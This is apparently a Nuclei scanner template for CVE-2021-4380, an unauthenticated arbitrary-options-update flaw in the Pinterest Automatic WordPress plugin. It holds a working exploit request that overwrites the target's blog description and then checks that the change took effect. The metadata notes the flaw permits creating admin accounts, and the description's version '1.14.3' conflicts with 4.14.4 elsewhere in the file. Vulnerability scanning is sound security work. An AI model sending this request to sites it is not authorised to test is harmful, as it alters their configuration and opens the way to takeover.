flow: http(1) && http(2) && http(3)
http:
- extractors:
  - group: 1
    internal: true
    name: common-blog-description
    part: body
    regex:
    - <div class="site-description">(.*?)</div>
    type: regex
  matchers:
  - condition: and
    dsl:
    - contains(body, "site-description")
    internal: true
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - len(body)==0
    internal: true
    type: dsl
  raw:
  - 'POST /?wp_pinterest_automatic=settings HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    blogdescription={{common-blog-description}}!

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "{{common-blog-description}}!")
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2021-4380
info:
  author: s4e-io
  classification:
    cpe: cpe:2.3:a:valvepress:pinterest_automatic_pin:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2021-4380
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    epss-percentile: 0.99246
    epss-score: 0.8366
  description: 'The Pinterest Automatic plugin for WordPress is vulnerable to authorization
    bypass due to missing capability checks on the ''wp_pinterest_automatic_parse_request''
    function and the ''process_form.php'' script in versions up to, and including,
    1.14.3. This makes it possible for unauthenticated attackers to update arbitrary
    options on a site that can be used to create new administrative user accounts
    or redirect unsuspecting site visitors.

    '
  impact: 'Unauthenticated attackers can update arbitrary WordPress options including
    creating administrative accounts or redirecting site visitors to malicious content.

    '
  metadata:
    framework: wordpress
    max-request: 3
    product: pinterest_automatic_pin
    vendor: valvepress
    verified: true
  name: Pinterest Automatic < 4.14.4 - Unauthenticated Arbitrary Options Update
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-4380
  - https://wpscan.com/vulnerability/ffd344fd-de2c-4f27-8932-41aa0a3c3d05
  - https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-pinterest-automatic-pin-security-bypass-4-14-3/
  - https://www.wordfence.com/threat-intel/vulnerabilities/id/e4fdc902-4cfe-4116-a294-9a0fcb2de346?source=cve
  - https://github.com/20142995/nuclei-templates
  remediation: Fixed in 4.14.4
  severity: critical
  tags: cve,cve2021,wordpress,wp,wp-plugin,wp,vkev,intrusive,pinterest-automatic-pin,vuln
